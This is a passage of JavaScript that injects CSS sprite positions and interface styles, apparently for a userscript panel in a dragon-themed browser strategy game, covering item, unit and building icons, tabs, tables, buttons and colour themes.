		background-position:  -78px -254px;\
	}\
	.i-ForestDragonHelmet {\
		background-position:    0px -272px;\
	}\
	.i-ForestDragonClawGuards {\
		background-position:  -26px -272px;\
	}\
	.i-ForestDragonBodyArmor {\
		background-position:  -52px -272px;\
	}\
	.i-ForestDragonTailGuard {\
		background-position:  -78px -272px;\
	}\
	.i-DesertDragonHelmet {\
		background-position: -109px -137px;\
	}\
	.i-DesertDragonClawGuards {\
		background-position: -136px -137px;\
	}\
	.i-DesertDragonBodyArmor {\
		background-position: -164px -137px;\
	}\
	.i-DesertDragonTailGuard {\
		background-position: -192px -137px;\
	}\
	.i-ChronoDragonHelmet {\
		background-position: -109px -154px;\
	}\
	.i-ChronoDragonClawGuards {\
		background-position: -137px -154px;\
	}\
	.i-ChronoDragonBodyArmor {\
		background-position: -165px -154px;\
	}\
	.i-ChronoDragonTailGuard {\
		background-position: -193px -154px;\
	}\
	/***********  Items Arsenal  **********/\
	.i-Fangtooth {\
		background-position:    0px -424px;\
	}\
	.i-Glowing {\
		background-position:  -26px -424px;\
	}\
	.i-Volcanic {\
		background-position:  -52px -424px;\
	}\
	.i-Glacial {\
		background-position:  -176px -424px;\
	}\
	.i-Banshee {\
		background-position:  -78px -424px;\
	}\
	.i-Reaper {\
		background-position: -130px -424px;\
	}\
	.i-Swamp {\
		background-position: -155px -424px;\
	}\
	.i-Titan {\
		background-position: -201px -424px;\
	}\
	.i-Anthropus {\
		background-position: -260px    0px;\
	}\
	.i-AquaTroopRespirator {\
		background-position:    0px -424px;\
	}\
	.i-AquaTroopRespiratorStack100 {\
		background-position:    0px -424px;\
	}\
	.i-AquaTroopRespiratorStack500 {\
		background-position:    0px -424px;\
	}\
	.i-StoneTroopItem {\
		background-position:  -26px -424px;\
	}\
	.i-StoneTroopItemStack100 {\
		background-position:  -26px -424px;\
	}\
	.i-StoneTroopItemStack500 {\
		background-position:  -26px -424px;\
	}\
	.i-FireTroopItem {\
		background-position:  -52px -424px;\
	}\
	.i-FireTroopItemStack100 {\
		background-position:  -52px -424px;\
	}\
	.i-FireTroopItemStack500 {\
		background-position:  -52px -424px;\
	}\
	.i-FrostGiantItem {\
		background-position:  -176px -424px;\
	}\
	.i-FrostGiantItemStack100 {\
		background-position:  -176px -424px;\
	}\
	.i-FrostGiantItemStack500 {\
		background-position:  -176px -424px;\
	}\
	.i-WindTroopItem {\
		background-position:  -78px -424px;\
	}\
	.i-WindTroopItemStack100 {\
		background-position:  -78px -424px;\
	}\
	.i-WindTroopItemStack500 {\
		background-position:  -78px -424px;\
	}\
	.i-IceTroopItem {\
		background-position: -130px -424px;\
	}\
	.i-IceTroopItemStack100 {\
		background-position: -130px -424px;\
	}\
	.i-IceTroopItemStack500 {\
		background-position: -130px -424px;\
	}\
	.i-SwampTroopItem {\
		background-position: -155px -424px;\
	}\
	.i-SwampTroopItemStack100 {\
		background-position: -155px -424px;\
	}\
	.i-SwampTroopItemStack500 {\
		background-position: -155px -424px;\
	}\
	.i-ForestTroopItem {\
		background-position: -201px -424px;\
	}\
	.i-ForestTroopItemStack100 {\
		background-position: -201px -424px;\
	}\
	.i-ForestTroopItemStack500 {\
		background-position: -201px -424px;\
	}\
	.i-DarkSlayerItem {\
		background-position: -224px -424px;\
	}\
	.i-Dragonfire {\
		background-position: -224px -424px;\
	}\
	.i-DarkSlayerItemStack100 {\
		background-position: -224px -424px;\
	}\
	.i-DarkSlayerItemStack500 {\
		background-position: -224px -424px;\
	}\
	.i-AnthropusTalisman {\
		background-position: -260px    0px;\
	}\
	.i-CurseLocusts {\
		background-position:    0px -290px;\
	}\
	.i-CurseWorms {\
		background-position:  -26px -290px;\
	}\
	.i-CurseFrogs {\
		background-position:  -52px -290px;\
	}\
	.i-CurseBats {\
		background-position:  -78px -290px;\
	}\
	.i-WaterDragonEgg {\
		background-position:  -0px -103px;\
	}\
	.i-StoneDragonEgg {\
		background-position:  -26px -103px;\
	}\
	.i-FireDragonEgg {\
		background-position:  -52px -103px;\
	}\
	.i-ForestDragonEgg {\
		background-position:  -151px -103px;\
	}\
	.i-WindDragonEgg {\
		background-position: -78px -103px;\
	}\
	.i-IceDragonEgg {\
		background-position: -104px -103px;\
	}\
	.i-SwampDragonEgg {\
		background-position: -131px -103px;\
	}\
	.i-DesertDragonEgg {\
		background-position: -176px -103px;\
	}\
	/***********  Items General  **********/\
	.i-Generals {\
		background-position:    -314px -0px;\
	}\
	.i-Troops {\
		background-position:    -573px -186px;\
	}\
	.i-Momentary {\
		background-position:    0px -306px;\
	}\
	.i-MomentaryTruce {\
		background-position:    0px -306px;\
	}\
	.i-ArmisticeAgreement {\
		background-position:  -26px -306px;\
	}\
	.i-CeaseFireTreaty {\
		background-position:  -52px -306px;\
	}\
	.i-CompletionGrant {\
		background-position:  -78px -306px;\
	}\
	.i-AncestralSeal {\
		background-position: -104px -306px;\
	}\
	.i-DarkWarpDevice {\
		background-position:    0px -324px;\
	}\
	.i-ChartedWarpDevice {\
		background-position:  -26px -324px;\
	}\
	.i-OutpostWarp {\
		background-position:  -52px -324px;\
	}\
	.i-GlowingShields {\
		background-position:    0px -341px;\
	}\
	.i-DragonHearts {\
		background-position:  -26px -341px;\
	}\
	.i-PurpleBones {\
		background-position:  -52px -341px;\
	}\
	.i-CrimsonBull {\
		background-position:  -78px -341px;\
	}\
	.i-Divinerations {\
		background-position:  -104px -341px;\
	}\
	.i-DivineLight {\
		background-position:  -130px -341px;\
	}\
	.i-NomadicRecruits {\
		background-position:  -156px -341px;\
	}\
	.i-SacredBull {\
		background-position:  -185px -341px;\
	}\
	.i-SacredBones {\
		background-position:  -213px -341px;\
	}\
	.i-MassNullifier {\
		background-position:    0px -358px;\
	}\
	.i-PseudonymGrant {\
		background-position:  -26px -358px;\
	}\
	.i-RenameProclamation {\
		background-position:  -52px -358px;\
	}\
	.i-RacechangeItem {\
		background-position:  -78px -358px;\
	}\
	.i-Fortunas {\
		background-position:    0px -375px;\
	}\
	.i-FortunasTicket {\
		background-position:    0px -375px;\
	}\
	.i-FortunasGoldenTicket {\
		background-position:  -26px -375px;\
	}\
	.i-FortunasAccelerator {\
		background-position:  -52px -375px;\
	}\
	.i-FortunasGift {\
		background-position:  -78px -375px;\
	}\
	.i-FortunasCauldron {\
		background-position:  -26px -375px;\
	}\
	/****    Units    ****/\
	.i-GreatDragon {\
		background-position:    0px -446px;\
	}\
	.i-WaterDragon {\
		background-position:  -26px -446px;\
	}\
	.i-StoneDragon {\
		background-position:  -52px -446px;\
	}\
	.i-FireDragon {\
		background-position:  -78px -446px;\
	}\
	.i-WindDragon {\
		background-position: -104px -446px;\
	}\
	.i-IceDragon {\
		background-position: -130px -446px;\
	}\
	.i-SwampDragon {\
		background-position: -162px -446px;\
	}\
	.i-ForestDragon {\
		background-position: -190px -446px;\
	}\
	.i-DesertDragon {\
		background-position: -262px -446px;\
	}\
	.i-ChronoDragon {\
		background-position: -352px -446px;\
	}\
	.i-SpectralDragon {\
		background-position: -234px -446px;\
	}\
	.i-UnsummonedSpectralDragon {\
		background-position: -287px -446px;\
	}\
	.i-Porter {\
		background-position:    0px -466px;\
	}\
	.i-Conscript {\
		background-position:  -26px -466px;\
	}\
	.i-Spy {\
		background-position:  -52px -466px;\
	}\
	.i-Halberdsman {\
		background-position:  -78px -466px;\
	}\
	.i-Minotaur {\
		background-position: -104px -466px;\
	}\
	.i-Longbowman {\
		background-position: -130px -466px;\
	}\
	.i-SwiftStrikeDragon {\
		background-position: -156px -466px;\
	}\
	.i-BattleDragon {\
		background-position: -182px -466px;\
	}\
	.i-ArmoredTransport {\
		background-position: -209px -466px;\
	}\
	.i-Giant {\
		background-position: -235px -466px;\
	}\
	.i-FireMirror {\
		background-position: -261px -466px;\
	}\
	.i-FrostGiant {\
		background-position: -465px -466px;\
	}\
	.i-PackDragon {\
		background-position: -287px -466px;\
	}\
	.i-AquaTroop {\
		background-position: -313px -466px;\
	}\
	.i-DesertTroop {\
		background-position: -512px -466px;\
	}\
	.i-StoneTroop {\
		background-position: -339px -466px;\
	}\
	.i-FireTroop {\
		background-position: -365px -466px;\
	}\
	.i-WindTroop {\
		background-position: -391px -466px;\
	}\
	.i-IceTroop {\
		background-position: -417px -466px;\
	}\
	.i-SwampTroop {\
		background-position: -445px -466px;\
	}\
	.i-ForestTroop {\
		background-position: -488px -466px;\
	}\
	.i-DarkSlayer {\
		background-position: -535px -466px;\
	}\
	.i-LightningCannon {\
		background-position: -558px -466px;\
	}\
	.i-ChargeTroop {\
		background-position: -587px -466px;\
	}\
	.i-VengeWyrm {\
		background-position: -619px -466px;\
	}\
	.i-DimensionalRuiner {\
		background-position: -650px -466px;\
	}\
	.i-ArcticLeviathan {\
		background-position: -680px -466px;\
	}\	/****    Maps    ****/\
	.i-AnthropusCamp {\
		background-position:  -365px -119px;\
	}\
	.i-Bog {\
		background-position:  -365px -136px;\
	}\
	.i-Forest {\
		background-position:  -365px -153px;\
	}\
	.i-Grassland {\
		background-position:  -365px -170px;\
	}\
	.i-Hill {\
		background-position:  -365px -187px;\
	}\
	.i-Lake {\
		background-position:  -365px -204px;\
	}\
	.i-Mountain {\
		background-position:  -365px -221px;\
	}\
	.i-Plain {\
		background-position:  -365px -238px;\
	}\
	.i-City {\
		background-position:  -365px -255px;\
	}\
	.i-Outpost {\
		background-position:  -365px -272px;\
	}\
	.i-Wildernesses {\
		background-position:  -365px -289px;\
	}\
	/****    Research    ****/\
	.i-Agriculture, .i-Rationing {\
		background-position:  -400px -119px;\
	}\
	.i-Woodcraft {\
		background-position:  -400px -136px;\
	}\
	.i-Masonry {\
		background-position:  -400px -153px;\
	}\
	.i-Mining {\
		background-position:  -400px -170px;\
	}\
	.i-Clairvoyance {\
		background-position:  -400px -187px;\
	}\
	.i-RapidDeployment, .i-Protected {\
		background-position:  -400px -204px;\
	}\
	.i-Ballistics {\
		background-position:  -400px -221px;\
	}\
	.i-Metallurgy {\
		background-position:  -400px -238px;\
	}\
	.i-Medicine, .i-Debug {\
		background-position:  -400px -255px;\
	}\
	.i-Dragonry {\
		background-position:  -400px -272px;\
	}\
	.i-Levitation {\
		background-position:  -400px -289px;\
	}\
	.i-Mercantilism {\
		background-position:  -400px -306px;\
	}\
	.i-AerialCombat {\
		background-position:  -400px -323px;\
	}\
	.i-EnergyCollection {\
		background-position:  -400px -340px;\
	}\
	.i-WarriorRevival {\
		background-position:  -400px -357px;\
	}\
	.i-GuardianRevival {\
		background-position:  -400px -374px;\
	}\
	/****    Buildings    ****/\
	.i-Mine-C {\
		background-position:  -422px -119px;\
	}\
	.i-Farm-C {\
		background-position:  -422px -136px;\
	}\
	.i-Lumbermill-C {\
		background-position:  -422px -153px;\
	}\
	.i-Quarry-C {\
		background-position:  -422px -170px;\
	}\
	.i-Home-C {\
		background-position:  -422px -187px;\
	}\
	.i-Garrison-C {\
		background-position:  -422px -204px;\
	}\
	.i-ScienceCenter-C {\
		background-position:  -422px -221px;\
	}\
	.i-Metalsmith-C {\
		background-position:  -422px -238px;\
	}\
	.i-OfficerQuarter-C {\
		background-position:  -422px -255px;\
	}\
	.i-MusterPoint-C {\
		background-position:  -422px -272px;\
	}\
	.i-Rookery-C {\
		background-position:  -422px -289px;\
	}\
	.i-StorageVault-C {\
		background-position:  -422px -306px;\
	}\
	.i-Theater-C {\
		background-position:  -422px -323px;\
	}\
	.i-Sentinel-C {\
		background-position:  -422px -340px;\
	}\
	.i-Factory-C {\
		background-position:  -422px -357px;\
	}\
	.i-Fortress-C {\
		background-position:  -422px -374px;\
	}\
	.i-DragonKeep-C {\
		background-position:  -422px -391px;\
	}\
	.i-Wall-C {\
		background-position:  -422px -408px;\
	}\
	.i-Mine-O {\
		background-position:  -450px -119px;\
	}\
	.i-Farm-O {\
		background-position:  -450px -136px;\
	}\
	.i-Lumbermill-O {\
		background-position:  -450px -153px;\
	}\
	.i-Quarry-O {\
		background-position:  -450px -170px;\
	}\
	.i-TrainingCamp-O {\
		background-position:  -450px -187px;\
	}\
	.i-Home-O {\
		background-position:  -450px -204px;\
	}\
	.i-Silo-O {\
		background-position:  -450px -221px;\
	}\
	.i-MusterPoint-O {\
		background-position:  -450px -238px;\
	}\
	.i-DragonKeep-O {\
		background-position:  -450px -255px;\
	}\
	.i-Wall-O {\
		background-position:  -450px -272px;\
	}\
	.i-EnergyCollector-S {\
		background-position:  -475px -119px;\
	}\
	.i-Mausoleum-S {\
		background-position:  -475px -136px;\
	}\
	.i-DarkPortal-S {\
		background-position:  -475px -153px;\
	}\
	.i-SpectralDragonKeep-S {\
		background-position:  -475px -170px;\
	}\
	/****************************************************************************/\
	.jewel {\
		padding				: 1px;\
		font-size			: 8pt !important;\
	}\
	.font8 {\
		font-size			: 8pt !important;\
	}\
	.font7 {\
		font-size			: 7pt !important;\
	}\
	.short {\
		height				:7px;\
	}\
	.wrap {\
		white-space			: normal !important;\
	}\
	.nowrap {\
		white-space			: nowrap !important;\
	}\
	.overflow {\
		overflow			: normal !important;\
	}\
	.overflow-y {\
		overflow-y			: normal !important;\
	}\
	.no-overflow {\
		overflow			: hidden !important;\
	}\
	.no-overflow-x {\
		overflow-x			: hidden !important;\
	}\
	.' + UID['hiding'] + ' {\
		padding-left		: 10px;\
		padding-right		: 10px;\
		margin-right		: -2px;\
		border-radius		: 2px;\
		-moz-border-radius	: 2px;\
		-webkit-box-shadow	: rgba(0,0,0,0.52) 0 0 2px;\
		-moz-box-shadow		: rgba(0,0,0,0.52) 0 0 2px;\
	}\
	.' + UID['defending'] + ' {\
		padding-left		: 10px;\
		padding-right		: 10px;\
		margin-right		: -2px;\
		border-radius		: 2px;\
		-moz-border-radius	: 2px;\
		-webkit-border-radius: 2px;\
		box-shadow			: rgba(0,0,0,0.52) 0 0 2px;\
		-moz-box-shadow		: rgba(0,0,0,0.52) 0 0 2px;\
		-webkit-box-shadow	: rgba(0,0,0,0.52) 0 0 2px;\
	}\
	.' + UID['scrollable'] + ' {\
		overflow			: auto !important;\
	}\
	.' + UID['main-box'] + ' .ui-dialog-content {\
		padding				: 2px !important;\
		overflow			: hidden !important;\
	}\
	.' + UID['main-box'] + ' h1 {\
		display				: inline-block;\
		font-size			: 12pt;\
		font-weight			: bold;\
	}\
	.' + UID['main-box'] + ' h2 {\
		display				: inline-block;\
		font-size			: 11pt;\
		font-weight			: bold;\
	}\
	.' + UID['main-box'] + ' h3 {\
		display				: inline-block;\
		font-size			: 10pt;\
		font-weight			: bold;\
	}\
	.' + UID['main-box'] + ' h4 {\
		display				: inline-block;\
		font-size			: 9pt;\
		font-weight			: bold;\
	}\
	.' + UID['main-box'] + ' h5 {\
		display				: inline-block;\
		font-size			: 8pt;\
		font-weight			: bold;\
	}\
	.' + UID['main-box'] + ' h6 {\
		display				: inline-block;\
		font-size			: 7pt;\
		font-weight			: bold;\
	}\
	.' + UID['main-box'] + ' .ui-accordion h1,\
	.' + UID['main-box'] + ' .ui-accordion h2,\
	.' + UID['main-box'] + ' .ui-accordion h3,\
	.' + UID['main-box'] + ' .ui-accordion h4,\
	.' + UID['main-box'] + ' .ui-accordion h5,\
	.' + UID['main-box'] + ' .ui-accordion h6\
	{\
		display				: block;\
	}\
	.' + UID['main-box'] + ' .ui-accordion *\
	{\
		font-size			: 9pt;\
	}\
	.' + UID['main-box'] + ' ul.tabs {\
		overflow			: hidden;\
		display				: block;\
		list-style			: none;\
		margin				: 0;\
		padding				: 0;\
		margin-top			: 4px;\
	}\
	.' + UID['main-box'] + ' ul.tabs li.tab {\
		display				: inline-block;\
		float				: left;\
		cursor				: pointer !important;\
	}\
	.' + UID['main-box'] + ' ul.tabs li.tab a {\
		display				: inline-block;\
		position			: relative;\
		font-weight			: bold;\
		line-height			: 20px;\
		padding-left		: 2px;\
		padding-right		: 3px;\
		padding-top			: 1px;\
		padding-bottom		: 1px;\
		border-width		: 1px;\
		border-style		: solid;\
		border-bottom		: 0;\
		border-left			: 0;\
		text-decoration		: none;\
		cursor				: pointer;\
	}\
	.' + UID['main-box'] + ' ul.tabs li.tab a span.' + UID['main-box'] + ' {\
		margin-left			: -2px;\
	}\
	.' + UID['main-box'] + ' ul.tabs li.first a {\
		border-left-width	: 1px !important;\
	}\
	.' + UID['main-box'] + ' ul.tabs li.first a.selected,\
	.' + UID['main-box'] + ' ul.tabs li.tab a.selected {\
		border-left-width	: 1px !important;\
		border-left-style	: solid !important;\
		box-shadow			: rgba(255,255,255,0.9) 0px 0px 3px inset, rgba(0,0,0,0.9) 0px 0px 3px;\
		-moz-box-shadow		: rgba(255,255,255,0.9) 0px 0px 3px inset, rgba(0,0,0,0.9) 0px 0px 3px;\
		-webkit-box-shadow	: rgba(255,255,255,0.9) 0px 0px 3px inset, rgba(0,0,0,0.9) 0px 0px 3px;\
		background-image	: linear-gradient(bottom, rgba(0,0,0,0) 1%, rgba(255,255,255,0.4) 99%);\
		background-image	: -moz-linear-gradient(bottom, rgba(0,0,0,0) 1%, rgba(255,255,255,0.4) 99%);\
		background-image	: -webkit-linear-gradient(bottom, rgba(0,0,0,0) 1%, rgba(255,255,255,0.4) 99%);\
	}\
	.' + UID['main-box'] + ' .container {\
		height				: auto;\
		width				: 100%;\
		overflow			: hidden;\
	}\
	.' + UID['main-box'] + ' .container ul.tabs li.tab a {\
		line-height			: 16px;\
	}\
	.' + UID['main-box'] + ' .container ul.tabs li.tab a.selected {\
		border-left-width	: 1px !important;\
		border-left-style	: solid !important;\
	}\
	.' + UID['title'] + ' {\
		font-weight			: bold;\
		padding-top			: 2px;\
		padding-bottom		: 2px;\
		text-align			: center;\
		border-radius		: 2px;\
		-moz-border-radius	: 2px;\
		-webkit-border-radius: 2px;\
	}\
	.' + UID['main-box'] + ' .ui-dialog-title *,\
	.' + UID['title'] + ' * {\
		display				: inline-block !important;\
		font-style			: normal !important;\
		font-size			: 10pt !important;\
		font-weight			: bold;\
		line-height			: 10pt !important;\
		text-decoration		: none !important;\
		padding				: 0;\
	}\
	.' + UID['subtitle'] + ' {\
		font-weight			: bold;\
		padding-top			: 2px;\
		padding-bottom		: 2px;\
		margin-bottom		: 3px;\
		text-align			: center;\
		border-radius		: 3px;\
		-moz-border-radius	: 3px;\
		-webkit-border-radius: 3px;\
	}\
	.' + UID['content'] + ' {\
		padding-left		: 3px;\
		padding-right		: 3px;\
		padding-top			: 2px;\
		padding-botom		: 1px;\
		border-radius		: 2px;\
		-moz-border-radius	: 2px;\
		-webkit-border-radius: 2px;\
		box-shadow			: rgba(0,0,0,0.5) 0 0 2px;\
		-moz-box-shadow		: rgba(0,0,0,0.5) 0 0 2px;\
		-webkit-box-shadow	: rgba(0,0,0,0.5) 0 0 2px;\
		overflow-x			: hidden;\
	}\
	.' + UID['status_ticker'] + ' {\
		padding				: 2px;\
		border-radius		: 1px;\
		-moz-border-radius	: 1px;\
		-webkit-border-radius: 1px;\
		box-shadow			: rgba(0,0,0,0.5) 0 0 2px;\
		-moz-box-shadow		: rgba(0,0,0,0.5) 0 0 2px;\
		-webkit-box-shadow	: rgba(0,0,0,0.5) 0 0 2px;\
	}\
	.' + UID['status_report'] + ' {\
		margin-top			: 5px;\
		height				: 106px;\
		max-height			: 106px;\
		overflow			: auto;\
		overflow-x			: hidden;\
	}\
	.' + UID['status_feedback'] + ' {\
		padding-top			: 5px;\
		padding-right		: 5px;\
		padding-bottom		: 0.5em;\
		padding-left		: 5px;\
		height				: 34px;\
		text-align			: left;\
		font-weight			: bold;\
		border-radius		: 3px;\
		-moz-border-radius	: 3px;\
	}\
	table.' + UID['table'] + ' tr td,\
	table.' + UID['compact_table'] + ' tr td,\
	table.' + UID['table_console'] + ' tr td {\
		border				: none;\
		background-color	: transparent;\
		white-space			: nowrap;\
		vertical-align		: top;\
		padding				: 0px;\
		line-height			: 16px;\
		cursor				: default;\
	}\
	table.' + UID['hide_inputbox'] + ' tr td {\
		padding-bottom		: 0px;\
		padding-right		: 0px;\
	}\
	table.' + UID['table'] + ' tr td {\
		padding				: 0px 4px;\
	}\
	table.' + UID['table'] + ' tr td.right,\
	table.' + UID['compact_table'] + ' tr td.right,\
		font-weight			: bold;\
		text-align			: right;\
		padding-right		: 5px;\
	}\
	table.' + UID['table_console'] + ' tr td {\
		white-space			: normal !important;\
	}\
	.' + UID['underline'] + ' {\
		background-color	: transparent;\
		padding				: 1px 4px 1px 4px;\
	}\
	table.' + UID['table'] + ' tr th,\
	table.' + UID['compact_table'] + ' tr th,\
	table.' + UID['compact_console'] + ' tr th,\
	table tr.' + UID['row_top_headers'] + ' td\
	{\
		font-weight			: bold;\
		text-align			: center;\
		line-height			: 11pt;\
		padding				: 1px 3px 1px 3px;\
		border-radius		: 2px;\
	}\
	tr.' + UID['no-attackable'] + ' * {\
		color				: #C00;\
	}\
	table.font8 * {\
		font-size			: 8pt !important;\
	}\
	table.zebra tr:nth-child(even) {\
		background-color	: rgba(255,255,255,0.3);\
	}\
	thead.fixed tr {\
		position			: relative;\
		display				: block;\
	}\
	tbody.scrollable {\
		display				: block;\
		overflow-x			: hidden !important;\
		width				: 100%\
	}\
	input.' + UID['btn_on'] + ',\
	input.' + UID['btn_off'] + ',\
	input.' + UID['bnt_red'] + ',\
	input.' + UID['bnt_green'] + ',\
	input.' + UID['bnt_blue'] + ',\
	input.' + UID['bnt_yellow'] + ',\
	input.' + UID['bnt_orange'] + ',\
	input.' + UID['bnt_cyan'] + ',\
	input.' + UID['bnt_purple'] + ',\
	input.' + UID['bnt_disabled'] + ',\
	.' + UID['main-box'] + ' input[type=button] {\
		width				: 130px;\
		padding-top			: 1px;\
		padding-bottom		: 1px;\
		color				: #FFE;\
		font-weight			: bold;\
		border-radius		: 3px;\
		-moz-border-radius	: 3px;\
		-webkit-border-radius: 3px;\
		background-image	: linear-gradient(bottom, rgba(0,0,0,0.1) 10%, rgba(255,255,255,0.3) 60%, rgba(255,255,255,0.5) 99%);\
		background-image	: -moz-linear-gradient(bottom, rgba(0,0,0,0.1) 10%, rgba(255,255,255,0.3) 60%, rgba(255,255,255,0.5) 99%);\
		background-image	: -webkit-linear-gradient(bottom, rgba(0,0,0,0.1) 10%, rgba(255,255,255,0.3) 60%, rgba(255,255,255,0.5) 99%);\
		box-shadow			: rgba(0,0,0,0.52) 1px 1px 1px;\
		-moz-box-shadow		: rgba(0,0,0,0.52) 1px 1px 1px;\
		-webkit-box-shadow	: rgba(0,0,0,0.52) 1px 1px 1px;\
		cursor				: hand;\
		cursor				: pointer;\
	}\
	input.thin {\
		width				: auto !important;\
		margin				: 0;\
		padding-top			: 0 !important;\
		padding-bottom		: 0 !important;\
		padding-left		: 2px;\
		padding-right		: 2px;\
		font-size			: 8pt;\
	}\
	input.short {\
		width				: 30px !important;\
	}\
	.' + UID['main-box'] + ' input[type=text] {\
		text-align			: right;\
		border				: 1px solid #888;\
		border-radius		: 2px;\
		-moz-border-radius	: 2px;\
		-webkit-border-radius: 2px;\
		box-shadow			: rgba(0,0,0,0.2) 1px 1px 3px inset;\
		-moz-box-shadow		: rgba(0,0,0,0.2) 1px 1px 3px inset;\
		-webkit-box-shadow	: rgba(0,0,0,0.2) 1px 1px 3px inset;\
	}\
	.' + UID['main-box'] + ' input[type=text]:active,\
	.' + UID['main-box'] + ' input[type=text]:focus {\
		box-shadow			: rgba(0,0,0,0.5) 1px 1px 4px inset;\
		-moz-box-shadow		: rgba(0,0,0,0.5) 1px 1px 4px inset;\
		-webkit-box-shadow	: rgba(0,0,0,0.5) 1px 1px 4px inset;\
	}\
	.' + UID['hide_inputbox'] + ' input[type=text] {\
		box-shadow			: rgba(0,0,0,0.2) 1px 1px 3px inset;\
		-moz-box-shadow		: rgba(0,0,0,0.2) 1px 1px 3px inset;\
		-webkit-box-shadow	: rgba(0,0,0,0.2) 1px 1px 3px inset;\
	}\
	.' + UID['main-box'] + ' select {\
		margin				: 0 !important;\
	}\
	.ui-widget-content select {\
		font-size			: 8pt !important;\
	}\
	table.' + UID['table'] + ' input[type=text],\
	table.' + UID['compact_table'] + ' input[type=text]\
	{\
		padding-top			: 0px;\
		padding-bottom		: 0px;\
	}\
	.' + UID['bold_red'] + ' {\
		font-weight			: bold;\
	}\
	span.' + UID['bold_red'] + ' {\
		color:#550000;\
		font-weight:bold;\
	}\
	span.' + UID['green'] + ' {\
		color:#009C1F;\
		font-weight:bold;\
	}\
	span.' + UID['blue'] + ' {\
		color:#0000AA;\
		font-weight:bold;\
	}\
	span.' + UID['red'] + ' {\
		color:#AA0000;\
		font-weight:bold;\
	}\
	hr.thin {\
		margin				: 2px 0px;\
		padding				: 0px;\
		opacity				: 0.9px;\
	}\
	.' + UID['map-viewer-box'] + ' .ui-dialog-content {\
		margin				: 0 !important;\
		padding				: 0 !important;\
		overflow			: hidden !important;\
	}\
	.' + UID['map-viewer'] + ' {\
		display				: block;\
		width				: 750px;\
		height				: 750px;\
		white-space			: pre;\
		font-family			: Lucida Console, Andale Mono, Courier New, Courier, monospace;\
		font-size			: 1px;\
		font-stretch		: ultra-expanded;\
		cursor				: default;\
	}\
	.' + UID['map-viewer-dragger'] + ' {\
		position 			: absolute;\
		display				: block;\
		cursor				: move;\
	}\
	.' + UID['map-viewer-dragger'] + ' .jewel {\
		position			: absolute;\
		display				: block;\
		margin-top			: -30px;\
		font-size			: 9pt;\
		cursor				: default;\
	}\
	.tfb-d {\
		font-size			: 10pt;\
		font-weight			: bold;\
		color				: #910033;\
		clear				: both;\
		margin-right		: 4px;\
	}\
	.tfb-h {\
		font-size			: 10pt;\
		color				: #5D2680;\
		clear				: both;\
		margin-right		: 4px;\
	}\
	.tfb-m {\
		font-size			: 9pt;\
		color				: #274A82;\
		clear				: both;\
		margin-right		: 4px;\
	}\
	.tfb-s {\
		font-size			: 8pt;\
		color				: #285BBC;\
		clear				: left;\
		margin-right		: 4px;\
	}\
	.tfr-d {\
		font-size			: 10pt;\
		font-weight			: bold;\
		color				: #D7006B;\
		clear				: both;\
		margin-right		: 4px;\
	}\
	.tfr-h {\
		font-size			: 10pt;\
		color				: #FF0000;\
		clear				: both;\
		margin-right		: 4px;\
	}\
	.tfr-m {\
		font-size			: 9pt;\
		color				: #FF4000;\
		clear				: both;\
		margin-right		: 4px;\
	}\
	.tfr-s {\
		font-size			: 8pt;\
		color				: #FF8000;\
		clear				: left;\
		margin-right		: 4px;\
	}\
	.tfg-d {\
		font-size			: 10pt;\
		font-weight			: bold;\
		color				: #D2D21E;\
		clear				: both;\
		margin-right		: 4px;\
	}\
	.tfg-h {\
		font-size			: 10pt;\
		color				: #00C144;\
		clear				: both;\
		margin-right		: 4px;\
	}\
	.tfg-m {\
		font-size			: 9pt;\
		color				: #1ED21E;\
		clear				: both;\
		margin-right		: 4px;\
	}\
	.tfg-s {\
		font-size			: 8pt;\
		color				: #71FF71;\
		clear				: left;\
		margin-right		: 4px;\
	}\
	').appendTo("head");
	
	
	
/** Add Color Theme CSS Styles 
******************************/
$J("<style>").append('\
	.jewel {\
		color				: #442 !important;\
	}\
	.' + UID['hiding'] + ' {\
		color				: #FFE;\
		background-color	: rgba(0,180,140,0.7);\
	}\
	.' + UID['defending'] + ' {\
		color				: #FFE;\
		background-color	: rgba(180,0,50,0.7);\
	}\
	.' + UID['main-box'] + ' ul.tabs {\
		border-bottom		: 1px solid rgba(135,135,135,0.6);\
	}\
	.' + UID['main-box'] + ' ul.tabs li.tab a {\
		color				: #444;\
		background-color	: rgba(200,200,200,0.8);\
		border-color		: rgba(140,140,140,0.6);\
	}\
	.' + UID['main-box'] + ' ul.tabs li.tab a:hover {\
		background-color	: rgba(215,215,215,0.9);\
	}\
	.' + UID['main-box'] + ' ul.tabs li.tab a.selected {\
		color				: #000;\
		background-color	: rgba(230,230,230,0.8);\
		border-color		: rgba(255,255,255,0.7);\
	}\
	.' + UID['main-box'] + ' ul.tabs li.tab a.selected:hover {\
		background-color	: rgba(230,230,230,0.8);\
	}\
	.' + UID['main-box'] + ' .container ul.tabs li.tab a {\
		background-color	: rgba(200,200,200,0.8);\
	}\
	.' + UID['main-box'] + ' .container ul.tabs li.tab a:hover {\
		background-color	: rgba(210,210,210,0.9);\
	}\
	.' + UID['main-box'] + ' .container ul.tabs li.tab a.selected {\
		background-color	: rgba(220,220,220,0.8);\
	}\
	.' + UID['title'] + ' {\
		color				: #FFE;\
		background-color	: rgba(30,30,30,0.7);\
		border				: 1px solid;\
		border-color		: rgba(255,255,255,0.6);\
	}\
	.' + UID['main-box'] + ' .ui-dialog-title *,\
	.' + UID['title'] + ' * {\
		color				: #FFE !important;\
	}\
	.' + UID['subtitle'] + ' {\
		color				: #FFE;\
		background-color	: rgba(40,40,40,0.3);\
		border				: 1px solid;\
		border-color		: rgba(255,255,255,0.5);\
		border-top			: rgba(150,150,150,0.5);\
		border-left			: rgba(150,150,150,0.5);\
		box-shadow			: 1px 1px 1px rgba(0,0,0,0.2) inset;\
		-moz-box-shadow		: 1px 1px 1px rgba(0,0,0,0.2) inset;\
		-webkit-box-shadow	: 1px 1px 1px rgba(0,0,0,0.2) inset;\
	}\
	.' + UID['content'] + ' {\
		border				: 1px solid rgba(210,210,210,0.7);\
	}\
	.' + UID['status_ticker'] + ' {\
		background-color	: rgba(255,245,220,0.5);\
		border				: 1px solid rgba(170,170,170,0.7);\
	}\
	.' + UID['status_feedback'] + ' {\
		background-color	: rgba(0,0,0,0.2);\
		border				: 1px solid rgba(220,220,220,0.7);\
		box-shadow			: 1px 1px 1px rgba(0,0,0,0.1) inset;\
		-moz-box-shadow		: 1px 1px 1px rgba(0,0,0,0.1) inset;\
		-webkit-box-shadow	: 1px 1px 1px rgba(0,0,0,0.1) inset;\
	}\
	.' + UID['underline'] + ' {\
		border-bottom		: 1px solid rgba(200,200,200,0.7);\
	}\
